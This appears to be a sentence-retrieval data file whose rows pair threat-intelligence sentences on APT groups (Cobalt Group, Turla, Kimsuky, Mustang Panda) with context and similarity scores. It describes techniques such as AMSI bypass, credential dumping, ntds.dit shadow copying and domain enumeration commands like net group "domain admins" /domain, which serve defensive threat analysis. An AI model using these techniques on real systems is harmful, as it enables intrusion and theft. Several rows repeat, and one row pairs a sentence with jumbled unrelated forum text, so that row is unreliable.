"leviathan has exploited multiple microsoft office and .net vulnerabilities for execution, including cve-2017-0199, cve-2017-8759, and cve-2017-11882.",[1][2][4][11][13][12]enterpriset1543.003create or modify system process:windows servicecobalt grouphas created new services to establish persistence. [4]enterpriset1573.002encrypted channel:asymmetric cryptographycobalt grouphas used the plink utility to create ssh tunnels.,"[4]enterpriset1203exploitation for client executioncobalt grouphad exploited multiple vulnerabilities for execution, including microsoft’s equation editor (cve-2017-11882), an internet explorer vulnerability (cve-2018-8174), cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[1][2][3][5][6][7][10][12]enterpriset1068exploitation for privilege escalationcobalt grouphas used exploits to increase their levels of rights and privileges. [4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks.,66f56b603063d294857002d4,1644,0.7921316254410384
"cobalt group had exploited multiple vulnerabilities for execution, including microsoft’s equation editor , an internet explorer vulnerability , cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[1][2][4][11][13][12]enterpriset1543.003create or modify system process:windows servicecobalt grouphas created new services to establish persistence. [4]enterpriset1573.002encrypted channel:asymmetric cryptographycobalt grouphas used the plink utility to create ssh tunnels.,"[4]enterpriset1203exploitation for client executioncobalt grouphad exploited multiple vulnerabilities for execution, including microsoft’s equation editor (cve-2017-11882), an internet explorer vulnerability (cve-2018-8174), cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[1][2][3][5][6][7][10][12]enterpriset1068exploitation for privilege escalationcobalt grouphas used exploits to increase their levels of rights and privileges. [4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks.,66f56b603063d294857002d4,1644,0.8559560335817181
"mustang panda has searched the entire target system for doc, docx, ppt, pptx, xls, xlsx, and pdf files.",[3]enterpriset1052.001exfiltration over physical medium:exfiltration over usbmustang pandahas used a customizedplugxvariant which could exfiltrate documents from air-gapped networks. [8]enterpriset1203exploitation for client executionmustang pandahas exploited cve-2017-0199 in microsoft word to execute code.,"[1]enterpriset1083file and directory discoverymustang pandahas searched the entire target system for doc, docx, ppt, pptx, xls, xlsx, and pdf files.",[8]enterpriset1564.001hide artifacts:hidden files and directoriesmustang panda'splugxvariant has created a hidden folder on usb drives namedrecycle.binto store malicious executables and collected data. [8]enterpriset1574.002hijack execution flow:dll side-loadingmustang pandahas used a legitimately signed executable to execute a malicious payload within a dll file.,66f56c243063d29485700320,3734,0.7634166298753848
cobalt group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.,[1][2][3][5][6][7][10][12]enterpriset1068exploitation for privilege escalationcobalt grouphas used exploits to increase their levels of rights and privileges. [4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks.,[1]enterpriset1105ingress tool transfercobalt grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.,[2][3]the group's javascript backdoor is also capable of downloading files. [11]enterpriset1559.002inter-process communication:dynamic data exchangecobalt grouphas sent malicious word ole compound documents to victims.,66f56b603063d294857002d4,1647,0.7818748663640496
the group's javascript backdoor is also capable of downloading files.,[4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks. [1]enterpriset1105ingress tool transfercobalt grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.,[2][3]the group's javascript backdoor is also capable of downloading files.,[11]enterpriset1559.002inter-process communication:dynamic data exchangecobalt grouphas sent malicious word ole compound documents to victims. [1]enterpriset1046network service discoverycobalt groupleveraged an open-source tool called softperfect network scanner to perform network scanning.,66f56b603063d294857002d4,1648,1.0
"by default, the ntds file  is located in %systemroot%\\ntds\\ntds.dit of a domain controller.","the command line version of wmi is called wmic.by default, wmi tracing is not enabled, so the wmi commands being executed and the associated user might not be available. additional information on wmi events and tracing can be found in thereferencessection of the advisory.ntds.dit active directory databasethe actor may try to exfiltrate the ntds.dit file and the system registry hive from windows domain controllers (dcs) out of the network to perform password cracking [t1003.003].","(the ntds.dit file is the main active directory (ad) database file and, by default, is stored at%systemroot%\\\\ntds\\\\ntds.dit.","this file contains information about users, groups, group memberships, and password hashes for all users in the domain; the system registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) although the ntds.dit file is locked while in use by ad, a copy can be made by creating a volume shadow copy and extracting the ntds.dit file from the shadow copy.",66f56be43063d29485700303,2988,0.7907764223854368
the group has also set a startup path to launch the powershell shell command and download cobalt strike.,[1][3][4].004application layer protocol:dnscobalt grouphas used dns tunneling for c2. [1][3][4]enterpriset1547.001boot or logon autostart execution:registry run keys / startup foldercobalt grouphas used registry run keys for persistence.,the group has also set a startup path to launch the powershell shell command and download cobalt strike.,[4]enterpriset1037.001boot or logon initialization scripts:logon script (windows)cobalt grouphas added persistence by registering the file name for the next stage malware underhkcu\\\\environment\\\\userinitmprlogonscript. [11]enterpriset1059.001command and scripting interpreter:powershellcobalt grouphas used powershell.exe to download and execute scripts.,66f56b603063d294857002d4,1635,1.0000000000000002
"cobalt group used the ammyy admin tool as well as teamviewer for remote access, including to preserve remote access if a cobalt strike module was lost.",[1][9]enterpriset1055process injectioncobalt grouphas injected code into trusted processes. [4]enterpriset1572protocol tunnelingcobalt grouphas used the plink utility to create ssh tunnels.,"[1][3][4]enterpriset1219remote access softwarecobalt groupused the ammyy admin tool as well as teamviewer for remote access, including to preserve remote access if a cobalt strike module was lost.",[2][3][4]enterpriset1021.001remote services:remote desktop protocolcobalt grouphas used remote desktop protocol to conduct lateral movement. [4]enterpriset1053.005scheduled task/job:scheduled taskcobalt grouphas created windows tasks to establish persistence.,66f56b603063d294857002d4,1658,0.8223511585316152
cobalt group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations.,"[2][3][4]enterpriset1027.010obfuscated files or information:command obfuscationcobalt groupobfuscated several scriptlets and code used on the victim’s machine, including through use of xor and rc4. [1][11]enterpriset1588.002obtain capabilities:toolcobalt grouphas obtained and used a variety of tools includingmimikatz,psexec,cobalt strike, andsdelete.",[3]enterpriset1566.001phishing:spearphishing attachmentcobalt grouphas sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations.,"attachment types have included .rtf, .doc, .xls, archives containing lnk files, and password protected archives containing .exe and .scr executables. [1][2][3][4][5][6][13][12].002phishing:spearphishing linkcobalt grouphas sent emails with urls pointing to malicious documents.",66f56b603063d294857002d4,1653,0.7057353862564617
"attachment types have included .rtf, .doc, .xls, archives containing lnk files, and password protected archives containing .exe and .scr executables.","[1][11]enterpriset1588.002obtain capabilities:toolcobalt grouphas obtained and used a variety of tools includingmimikatz,psexec,cobalt strike, andsdelete. [3]enterpriset1566.001phishing:spearphishing attachmentcobalt grouphas sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations.","attachment types have included .rtf, .doc, .xls, archives containing lnk files, and password protected archives containing .exe and .scr executables.",[1][2][3][4][5][6][13][12].002phishing:spearphishing linkcobalt grouphas sent emails with urls pointing to malicious documents. [1][9]enterpriset1055process injectioncobalt grouphas injected code into trusted processes.,66f56b603063d294857002d4,1654,1.0000000000000002
"the login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.","fire stick? even if is offline, i can’t recommend, in order, hardware key a: i never advise people to enter the consume local media (plex, jellyfin, (yubikey), software key (token), voip cryptocurrency game as an investment.",etc).,"a nuc or similar sffpc is doable sms, then traditional sms. any 2fa is i use it only as a tool to make private but for wife and kids, navigating the better than none, but true sms is last purchases.",66f56b473063d294857002cd,192,0.7474656316488795
the group has used an exploit toolkit known as threadkit that launches .bat files.,[11]enterpriset1059.001command and scripting interpreter:powershellcobalt grouphas used powershell.exe to download and execute scripts. [1][2][3][4][7][12].003command and scripting interpreter:windows command shellcobalt grouphas used a javascript backdoor that is capable of launching cmd.exe to execute shell commands.,[11]the group has used an exploit toolkit known as threadkit that launches .bat files.,[1][2][4][11][13][12].005command and scripting interpreter:visual basiccobalt grouphas sent word ole compound documents with malicious obfuscated vba macros that will run upon user execution. [1][2][4][11][13][12].007command and scripting interpreter:javascriptcobalt grouphas executed javascript scriptlets on the victim's machine.,66f56b603063d294857002d4,1639,0.9484613675465564
"cobalt group had exploited multiple vulnerabilities for execution, including microsoft’s equation editor , an internet explorer vulnerability , cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[1][2][4][11][13][12]enterpriset1543.003create or modify system process:windows servicecobalt grouphas created new services to establish persistence. [4]enterpriset1573.002encrypted channel:asymmetric cryptographycobalt grouphas used the plink utility to create ssh tunnels.,"[4]enterpriset1203exploitation for client executioncobalt grouphad exploited multiple vulnerabilities for execution, including microsoft’s equation editor (cve-2017-11882), an internet explorer vulnerability (cve-2018-8174), cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[1][2][3][5][6][7][10][12]enterpriset1068exploitation for privilege escalationcobalt grouphas used exploits to increase their levels of rights and privileges. [4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks.,66f56b603063d294857002d4,1644,0.8559560335817181
"mustang panda has searched the entire target system for doc, docx, ppt, pptx, xls, xlsx, and pdf files.",[3]enterpriset1052.001exfiltration over physical medium:exfiltration over usbmustang pandahas used a customizedplugxvariant which could exfiltrate documents from air-gapped networks. [8]enterpriset1203exploitation for client executionmustang pandahas exploited cve-2017-0199 in microsoft word to execute code.,"[1]enterpriset1083file and directory discoverymustang pandahas searched the entire target system for doc, docx, ppt, pptx, xls, xlsx, and pdf files.",[8]enterpriset1564.001hide artifacts:hidden files and directoriesmustang panda'splugxvariant has created a hidden folder on usb drives namedrecycle.binto store malicious executables and collected data. [8]enterpriset1574.002hijack execution flow:dll side-loadingmustang pandahas used a legitimately signed executable to execute a malicious payload within a dll file.,66f56c243063d29485700320,3734,0.7634166298753848
the group's javascript backdoor is also capable of downloading files.,[4]enterpriset1070.004indicator removal:file deletioncobalt groupdeleted the dll dropper from the victim’s machine to cover their tracks. [1]enterpriset1105ingress tool transfercobalt grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.,[2][3]the group's javascript backdoor is also capable of downloading files.,[11]enterpriset1559.002inter-process communication:dynamic data exchangecobalt grouphas sent malicious word ole compound documents to victims. [1]enterpriset1046network service discoverycobalt groupleveraged an open-source tool called softperfect network scanner to perform network scanning.,66f56b603063d294857002d4,1648,1.0
the group has also set a startup path to launch the powershell shell command and download cobalt strike.,[1][3][4].004application layer protocol:dnscobalt grouphas used dns tunneling for c2. [1][3][4]enterpriset1547.001boot or logon autostart execution:registry run keys / startup foldercobalt grouphas used registry run keys for persistence.,the group has also set a startup path to launch the powershell shell command and download cobalt strike.,[4]enterpriset1037.001boot or logon initialization scripts:logon script (windows)cobalt grouphas added persistence by registering the file name for the next stage malware underhkcu\\\\environment\\\\userinitmprlogonscript. [11]enterpriset1059.001command and scripting interpreter:powershellcobalt grouphas used powershell.exe to download and execute scripts.,66f56b603063d294857002d4,1635,1.0000000000000002
kimsuky has used modified versions of phproxy to examine web traffic between the victim and the accessed website.,[10][13][5][3][4][12].004acquire infrastructure:serverkimsukyhas purchased hosting servers with virtual currency and prepaid cards. [12].006acquire infrastructure:web serviceskimsukyhas hosted content used for targeting efforts via web services such as blogspot.,[14]enterpriset1557adversary-in-the-middlekimsukyhas used modified versions of phproxy to examine web traffic between the victim and the accessed website.,[5]enterpriset1071.001application layer protocol:web protocolskimsukyhas used http get and post requests for c2. [14].002application layer protocol:file transfer protocolskimsukyhas used ftp to download additional malware to the target machine.,66f56c683063d2948570034b,56,0.7523365557272393
kimsuky has a hwp document stealer module which changes the default program association in the registry to open hwp documents.,[5]enterpriset1585.001establish accounts:social media accountskimsukyhas created social media accounts to monitor news and security trends as well as potential targets. [12].002establish accounts:email accountskimsukyhas created email accounts for phishing operations.,[12]enterpriset1546.001event triggered execution:change default file associationkimsukyhas a hwp document stealer module which changes the default program association in the registry to open hwp documents.,[16]enterpriset1041exfiltration over c2 channelkimsukyhas exfiltrated data over its c2 channel. [16][14]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagekimsukyhas exfiltrated stolen files and data to actor-controlled blogspot accounts.,66f56c683063d2948570034b,84,0.7377403843347077
turla has modified variables in kernel memory to turn off driver signature enforcement after exploiting vulnerabilities that obtained kernel mode privileges.,"[1]enterpriset1018remote system discoveryturlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /domaincommands.turlahas also usednet group ""domain computers"" /domain,net group ""domain controllers"" /domain, andnet group ""exchange servers"" /domainto enumerate domain computers, including the organization's dc and exchange server. [1][14]enterpriset1518.001software discovery:security software discoveryturlahas obtained information on security software, including security logging information that may indicate whether their malware has been detected.",[14]enterpriset1553.006subvert trust controls:code signing policy modificationturlahas modified variables in kernel memory to turn off driver signature enforcement after exploiting vulnerabilities that obtained kernel mode privileges.,"[22][24]enterpriset1082system information discoveryturlasurveys a system upon check-in to discover operating system configuration details using thesysteminfoandsetcommands. [1][14]enterpriset1016system network configuration discoveryturlasurveys a system upon check-in to discover network configuration details using thearp -a,nbtstat -n,net config,ipconfig /all, androutecommands, as well asnbtscan.",66f56d333063d294857003b2,2954,0.7473909967295493
turla has used a custom .net tool to collect documents from an organization's internal central database.,[21][13][10].006compromise infrastructure:web servicesturlahas frequently used compromised wordpress sites for c2 infrastructure. [21]enterpriset1555.004credentials from password stores:windows credential managerturlahas gathered credentials from the windows credential manager tool.,[18]enterpriset1213data from information repositoriesturlahas used a custom .net tool to collect documents from an organization's internal central database.,[14]enterpriset1005data from local systemturlarpc backdoors can upload files from victim machines. [11]enterpriset1025data from removable mediaturlarpc backdoors can collect files from usb thumb drives.,66f56d333063d294857003b2,2914,0.704016720163626
"turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a wmi filter or powershell profile, to decode encrypted powershell payloads.",[14]enterpriset1005data from local systemturlarpc backdoors can upload files from victim machines. [11]enterpriset1025data from removable mediaturlarpc backdoors can collect files from usb thumb drives.,"[11][18]enterpriset1140deobfuscate/decode files or informationturlahas used a custom decryption routine, which pulls key and salt values from other artifacts such as a wmi filter orpowershell profile, to decode encrypted powershell payloads.",[11]enterpriset1587.001develop capabilities:malwareturlahas developed its own unique malware for use in operations. [21]enterpriset1189drive-by compromiseturlahas infected victims using watering holes.,66f56d333063d294857003b2,2917,0.772785401809779
"turla has used a amsi bypass, which patches the in-memory amsi.dll, in powershell scripts to bypass windows antimalware products.",[1][14]turlarpc backdoors have also searched for files matching thelph*.dllpattern. [11]enterpriset1615group policy discoveryturlasurveys a system upon check-in to discover group policy details using thegpresultcommand.,"[14]enterpriset1562.001impair defenses:disable or modify toolsturlahas used a amsi bypass, which patches the in-memory amsi.dll, in powershell scripts to bypass windows antimalware products.",[11]enterpriset1105ingress tool transferturlahas used shellcode to download meterpreter after compromising a victim. [16]enterpriset1570lateral tool transferturlarpc backdoors can be used to transfer files to/from victim machines on the local network.,66f56d333063d294857003b2,2928,0.7727452830892407
turla has also exfiltrated stolen files to onedrive and 4shared.,[11].013event triggered execution:powershell profileturlahas used powershell profiles to maintain persistence on an infected machine. [11]enterpriset1567.002exfiltration over web service:exfiltration to cloud storageturlahas used webdav to upload stolen usb files to a cloud drive.,[18]turlahas also exfiltrated stolen files to onedrive and 4shared.,"[14]enterpriset1068exploitation for privilege escalationturlahas exploited vulnerabilities in the vboxdrv.sys driver to obtain kernel mode privileges. [22]enterpriset1083file and directory discoveryturlasurveys a system upon check-in to discover files in specific locations on the hard disk %temp% directory, the current user's desktop, the program files directory, and recent.",66f56d333063d294857003b2,2923,0.7434859860263454
turla has exploited vulnerabilities in the vboxdrv.sys driver to obtain kernel mode privileges.,[11]enterpriset1567.002exfiltration over web service:exfiltration to cloud storageturlahas used webdav to upload stolen usb files to a cloud drive. [18]turlahas also exfiltrated stolen files to onedrive and 4shared.,[14]enterpriset1068exploitation for privilege escalationturlahas exploited vulnerabilities in the vboxdrv.sys driver to obtain kernel mode privileges.,"[22]enterpriset1083file and directory discoveryturlasurveys a system upon check-in to discover files in specific locations on the hard disk %temp% directory, the current user's desktop, the program files directory, and recent. [1][14]turlarpc backdoors have also searched for files matching thelph*.dllpattern.",66f56d333063d294857003b2,2924,0.7327862470854202
"turla surveys a system upon check-in to discover files in specific locations on the hard disk %temp% directory, the current user's desktop, the program files directory, and recent.",[18]turlahas also exfiltrated stolen files to onedrive and 4shared. [14]enterpriset1068exploitation for privilege escalationturlahas exploited vulnerabilities in the vboxdrv.sys driver to obtain kernel mode privileges.,"[22]enterpriset1083file and directory discoveryturlasurveys a system upon check-in to discover files in specific locations on the hard disk %temp% directory, the current user's desktop, the program files directory, and recent.",[1][14]turlarpc backdoors have also searched for files matching thelph*.dllpattern. [11]enterpriset1615group policy discoveryturlasurveys a system upon check-in to discover group policy details using thegpresultcommand.,66f56d333063d294857003b2,2925,0.8102825377306054
turla and its rpc backdoors have used apis calls for various tasks related to subverting amsi and accessing then executing commands through rpc and/or named pipes.,[16]enterpriset1570lateral tool transferturlarpc backdoors can be used to transfer files to/from victim machines on the local network. [11][18]enterpriset1112modify registryturlahas modify registry values to store payloads.,[11][18]enterpriset1106native apiturlaand its rpc backdoors have used apis calls for various tasks related to subverting amsi and accessing then executing commands through rpc and/or named pipes.,"[11]enterpriset1027.005obfuscated files or information:indicator removal from toolsbased on comparison ofgazerversions,turlamade an effort to obfuscate strings in the malware that could be used as iocs, including the mutex name and named pipe. [2].010obfuscated files or information:command obfuscationturlahas used encryption (including salted 3des viapowersploit'sout-encryptedscript.ps1), random variable names, and base64 encoding to obfuscate powershell commands and payloads.",66f56d333063d294857003b2,2932,0.8458123370004734
kimsuky has used the nirsoft sniffpass network sniffer to obtain passwords sent over non-secure protocols.,[18]enterpriset1112modify registrykimsukyhas modified registry settings for default file associations to enable all macros and for persistence. [5][17][14][12]enterpriset1111multi-factor authentication interceptionkimsukyhas used a proprietary tool to intercept one time passwords required for two-factor authentication.,[12]enterpriset1040network sniffingkimsukyhas used the nirsoft sniffpass network sniffer to obtain passwords sent over non-secure protocols.,[5][6]enterpriset1027obfuscated files or informationkimsukyhas obfuscated binary strings including the use of xor encryption and base64 encoding. [10][15]kimsukyhas also modified the first byte of dll implants targeting victims to prevent recognition of the executable file format.,66f56c683063d2948570034b,106,0.7822728700673659
turla rpc backdoors have also enumerated processes associated with specific open ports or named pipes.,[14]enterpriset1566.002phishing:spearphishing linkturlaattempted to trick targets into clicking on a link featuring a seemingly legitimate domain from adobe.com to download their malware and gain initial access. [4]enterpriset1057process discoveryturlasurveys a system upon check-in to discover running processes using thetasklist /vcommand.,[1]turlarpc backdoors have also enumerated processes associated with specific open ports or named pipes.,[11]enterpriset1055process injectionturlahas also usedpowersploit'sinvoke-reflectivepeinjection.ps1to reflectively load a powershell payload into a random process on the victim system. [11].001dynamic-link library injectionturlahas used metasploit to perform reflective dll injection in order to escalate privileges.,66f56d333063d294857003b2,2944,0.8118450916637292
turla rpc backdoors have included local upnp rpc proxies.,[11]enterpriset1055process injectionturlahas also usedpowersploit'sinvoke-reflectivepeinjection.ps1to reflectively load a powershell payload into a random process on the victim system. [11].001dynamic-link library injectionturlahas used metasploit to perform reflective dll injection in order to escalate privileges.,[16][23]enterpriset1090proxyturlarpc backdoors have included local upnp rpc proxies.,[11].001internal proxyturlahas compromised internal network systems to act as a proxy to forward traffic to c2. [10]enterpriset1012query registryturlasurveys a system upon check-in to discover information in the windows registry with thereg querycommand.,66f56d333063d294857003b2,2947,0.7084742135316371
turla has also retrieved powershell payloads hidden in registry keys as well as checking keys associated with null session named pipes .,[11].001internal proxyturlahas compromised internal network systems to act as a proxy to forward traffic to c2. [10]enterpriset1012query registryturlasurveys a system upon check-in to discover information in the windows registry with thereg querycommand.,[1]turlahas also retrieved powershell payloads hidden in registry keys as well as checking keys associated with null session named pipes .,"[11]enterpriset1021.002remote services:smb/windows admin sharesturlausednet usecommands to connect to lateral systems within a network. [1]enterpriset1018remote system discoveryturlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /domaincommands.turlahas also usednet group ""domain computers"" /domain,net group ""domain controllers"" /domain, andnet group ""exchange servers"" /domainto enumerate domain computers, including the organization's dc and exchange server.",66f56d333063d294857003b2,2950,0.908357929000547
"additionally, a turla custom executable containing metasploit shellcode is saved to the startup folder to gain persistence.",[17]enterpriset1560.001archive collected data:archive via utilityturlahas encrypted files stolen from connected usb drives into a rar file before exfiltration. [18]enterpriset1547.001boot or logon autostart execution:registry run keys / startup folderaturlajavascript backdoor added a local_update_check value under the registry keyhklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runto establish persistence.,"additionally, aturlacustom executable containing metasploit shellcode is saved to the startup folder to gain persistence.",[4][16].004boot or logon autostart execution:winlogon helper dllturlaestablished persistence by adding a shell value under the registry keyhkcu\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\winlogon. [4]enterpriset1110brute forceturlamay attempt to connect to systems within a victim's network usingnet usecommands and a predefined list or collection of passwords.,66f56d333063d294857003b2,2902,0.8194695180788214
"turla has also used net group ""domain computers"" /domain, net group ""domain controllers"" /domain, and net group ""exchange servers"" /domain to enumerate domain computers, including the organization's dc and exchange server.",[1]turlahas also retrieved powershell payloads hidden in registry keys as well as checking keys associated with null session named pipes . [11]enterpriset1021.002remote services:smb/windows admin sharesturlausednet usecommands to connect to lateral systems within a network.,"[1]enterpriset1018remote system discoveryturlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /domaincommands.turlahas also usednet group ""domain computers"" /domain,net group ""domain controllers"" /domain, andnet group ""exchange servers"" /domainto enumerate domain computers, including the organization's dc and exchange server.","[1][14]enterpriset1518.001software discovery:security software discoveryturlahas obtained information on security software, including security logging information that may indicate whether their malware has been detected. [14]enterpriset1553.006subvert trust controls:code signing policy modificationturlahas modified variables in kernel memory to turn off driver signature enforcement after exploiting vulnerabilities that obtained kernel mode privileges.",66f56d333063d294857003b2,2952,0.7081189699125295
"turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected.","[11]enterpriset1021.002remote services:smb/windows admin sharesturlausednet usecommands to connect to lateral systems within a network. [1]enterpriset1018remote system discoveryturlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /domaincommands.turlahas also usednet group ""domain computers"" /domain,net group ""domain controllers"" /domain, andnet group ""exchange servers"" /domainto enumerate domain computers, including the organization's dc and exchange server.","[1][14]enterpriset1518.001software discovery:security software discoveryturlahas obtained information on security software, including security logging information that may indicate whether their malware has been detected.",[14]enterpriset1553.006subvert trust controls:code signing policy modificationturlahas modified variables in kernel memory to turn off driver signature enforcement after exploiting vulnerabilities that obtained kernel mode privileges. [22][24]enterpriset1082system information discoveryturlasurveys a system upon check-in to discover operating system configuration details using thesysteminfoandsetcommands.,66f56d333063d294857003b2,2953,0.7463042185057583
turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from adobe.com to download their malware and gain initial access.,"[14]enterpriset1069.001permission groups discovery:local groupsturlahas usednet localgroupandnet localgroup administratorsto enumerate group information, including members of the local administrators group. [14].002permission groups discovery:domain groupsturlahas usednet group ""domain admins"" /domainto identify domain administrators.",[14]enterpriset1566.002phishing:spearphishing linkturlaattempted to trick targets into clicking on a link featuring a seemingly legitimate domain from adobe.com to download their malware and gain initial access.,[4]enterpriset1057process discoveryturlasurveys a system upon check-in to discover running processes using thetasklist /vcommand. [1]turlarpc backdoors have also enumerated processes associated with specific open ports or named pipes.,66f56d333063d294857003b2,2942,0.7482996519056871
kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.,"[12]enterpriset1003.001os credential dumping:lsass memorykimsukyhas gathered credentials usingmimikatzand procdump. [5][6][12]enterpriset1566.001phishing:spearphishing attachmentkimsukyhas used emails containing word, excel and/or hwp (hangul word processor) documents in their spearphishing campaigns.",[9][16][10][15][3][4][14][12].002phishing:spearphishing linkkimsukyhas sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.,[1][6][12]enterpriset1598.003phishing for information:spearphishing linkkimsukyhas used links in e-mail to steal account information. [15][4][12]enterpriset1057process discoverykimsukycan gather a list of all processes running on a victim's machine.,66f56c683063d2948570034b,114,0.7106386751492733
turla rpc backdoors have also retrieved registered rpc interface information from process memory.,"[22][24]enterpriset1082system information discoveryturlasurveys a system upon check-in to discover operating system configuration details using thesysteminfoandsetcommands. [1][14]enterpriset1016system network configuration discoveryturlasurveys a system upon check-in to discover network configuration details using thearp -a,nbtstat -n,net config,ipconfig /all, androutecommands, as well asnbtscan.",[1][18][14]turlarpc backdoors have also retrieved registered rpc interface information from process memory.,"[11].001internet connection discoveryturlahas usedtracertto check internet connectivity. [14]enterpriset1049system network connections discoveryturlasurveys a system upon check-in to discover active local network connections using thenetstat -an,net use,net file, andnet sessioncommands.",66f56d333063d294857003b2,2957,0.7371301851682593
kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics.,[16][14].004impair defenses:disable or modify system firewallkimsukyhas been observed disabling the system firewall. [16]enterpriset1070.004indicator removal:file deletionkimsukyhas deleted the exfiltrated data on disk after transmission.kimsukyhas also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.,[16][14][12].006indicator removal:timestompkimsukyhas manipulated timestamps for creation or compilation dates to defeat anti-forensics.,"[3]enterpriset1105ingress tool transferkimsukyhas downloaded additional scripts, tools, and malware onto victim systems. [17][14]enterpriset1056.001input capture:keyloggingkimsukyhas used a powershell-based keylogger as well as a tool called mechanical to log keystrokes.",66f56c683063d2948570034b,98,0.7061726136707369
"kimsuky has used modified versions of open source php web shells to maintain access, often adding ""dinosaur"" references within the code.","[4].002search open websites/domains:search engineskimsukyhas searched for vulnerabilities, tools, and geopolitical trends on google to target victims. [12]enterpriset1594search victim-owned websiteskimsukyhas searched for information on the target company's website.","[12]enterpriset1505.003server software component:web shellkimsukyhas used modified versions of open source php web shells to maintain access, often adding ""dinosaur"" references within the code.","[5]enterpriset1518.001software discovery:security software discoverykimsukyhas checked for the presence of antivirus software withpowershell get-ciminstance -namespace root/securitycenter2 – classname antivirusproduct. [12]enterpriset1608.001stage capabilities:upload malwarekimsukyhas used blogspot to host malicious content such as beacons, file exfiltrators, and implants.",66f56c683063d2948570034b,126,0.7396101642970355
kimsuky has used modified versions of phproxy to examine web traffic between the victim and the accessed website.,[10][13][5][3][4][12].004acquire infrastructure:serverkimsukyhas purchased hosting servers with virtual currency and prepaid cards. [12].006acquire infrastructure:web serviceskimsukyhas hosted content used for targeting efforts via web services such as blogspot.,[14]enterpriset1557adversary-in-the-middlekimsukyhas used modified versions of phproxy to examine web traffic between the victim and the accessed website.,[5]enterpriset1071.001application layer protocol:web protocolskimsukyhas used http get and post requests for c2. [14].002application layer protocol:file transfer protocolskimsukyhas used ftp to download additional malware to the target machine.,66f56c683063d2948570034b,56,0.7523365557272393
kimsuky has a hwp document stealer module which changes the default program association in the registry to open hwp documents.,[5]enterpriset1585.001establish accounts:social media accountskimsukyhas created social media accounts to monitor news and security trends as well as potential targets. [12].002establish accounts:email accountskimsukyhas created email accounts for phishing operations.,[12]enterpriset1546.001event triggered execution:change default file associationkimsukyhas a hwp document stealer module which changes the default program association in the registry to open hwp documents.,[16]enterpriset1041exfiltration over c2 channelkimsukyhas exfiltrated data over its c2 channel. [16][14]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagekimsukyhas exfiltrated stolen files and data to actor-controlled blogspot accounts.,66f56c683063d2948570034b,84,0.7377403843347077
"turla has used a custom decryption routine, which pulls key and salt values from other artifacts such as a wmi filter or powershell profile, to decode encrypted powershell payloads.",[14]enterpriset1005data from local systemturlarpc backdoors can upload files from victim machines. [11]enterpriset1025data from removable mediaturlarpc backdoors can collect files from usb thumb drives.,"[11][18]enterpriset1140deobfuscate/decode files or informationturlahas used a custom decryption routine, which pulls key and salt values from other artifacts such as a wmi filter orpowershell profile, to decode encrypted powershell payloads.",[11]enterpriset1587.001develop capabilities:malwareturlahas developed its own unique malware for use in operations. [21]enterpriset1189drive-by compromiseturlahas infected victims using watering holes.,66f56d333063d294857003b2,2917,0.772785401809779
turla and its rpc backdoors have used apis calls for various tasks related to subverting amsi and accessing then executing commands through rpc and/or named pipes.,[16]enterpriset1570lateral tool transferturlarpc backdoors can be used to transfer files to/from victim machines on the local network. [11][18]enterpriset1112modify registryturlahas modify registry values to store payloads.,[11][18]enterpriset1106native apiturlaand its rpc backdoors have used apis calls for various tasks related to subverting amsi and accessing then executing commands through rpc and/or named pipes.,"[11]enterpriset1027.005obfuscated files or information:indicator removal from toolsbased on comparison ofgazerversions,turlamade an effort to obfuscate strings in the malware that could be used as iocs, including the mutex name and named pipe. [2].010obfuscated files or information:command obfuscationturlahas used encryption (including salted 3des viapowersploit'sout-encryptedscript.ps1), random variable names, and base64 encoding to obfuscate powershell commands and payloads.",66f56d333063d294857003b2,2932,0.8458123370004734
kimsuky has used the nirsoft sniffpass network sniffer to obtain passwords sent over non-secure protocols.,[18]enterpriset1112modify registrykimsukyhas modified registry settings for default file associations to enable all macros and for persistence. [5][17][14][12]enterpriset1111multi-factor authentication interceptionkimsukyhas used a proprietary tool to intercept one time passwords required for two-factor authentication.,[12]enterpriset1040network sniffingkimsukyhas used the nirsoft sniffpass network sniffer to obtain passwords sent over non-secure protocols.,[5][6]enterpriset1027obfuscated files or informationkimsukyhas obfuscated binary strings including the use of xor encryption and base64 encoding. [10][15]kimsukyhas also modified the first byte of dll implants targeting victims to prevent recognition of the executable file format.,66f56c683063d2948570034b,106,0.7822728700673659
